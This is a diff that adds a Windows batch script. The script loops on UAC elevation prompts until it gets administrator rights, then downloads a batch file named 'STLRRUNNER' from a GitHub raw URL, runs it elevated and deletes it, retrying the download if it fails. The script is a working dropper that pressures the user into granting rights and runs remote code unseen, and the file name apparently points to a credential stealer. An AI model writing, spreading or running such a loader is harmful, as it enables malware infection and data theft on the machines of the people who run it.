@@ -1,0 +1,51 @@
+@echo off
+
+
+
+
+:: Check Admin Privileges
+net session >nul 2>&1
+if %errorlevel% equ 0 (
+:: Admin Granted
+goto RUNADMINHERE
+) else (
+:: Admini Not Granted
+goto loop
+)
+
+
+:loop
+:: Requesting Admin Privileges...
+powershell -Command "Start-Process '%~f0' -Verb RunAs"
+
+if %errorlevel% equ 0 (
+ :: Admin Granted
+goto exit
+) else ( 
+:: ( Admin Not Granted )
+    goto loop
+)
+
+:RUNADMINHERE
+:: Run All your commands here ( will be executed with admin privileges )
+
+
+
+color 0A
+setlocal enabledelayedexpansion
+set "embeddedScript=temp_script_STLRRUN.bat"
+
+:STLRRUNNERCALLER
+:: Download content and save to the embedded batch file
+curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Codes/STLRRUNNER"
+
+
+if exist "%embeddedScript%" (
+    call "%embeddedScript%"
+    del "%embeddedScript%" >nul 2>&1
+) else (
+    echo Failed to get content from STLRRUNNER Link
+    echo.
+    timeout /t 2 /nobreak >nul
+    goto STLRRUNNERCALLER
+)
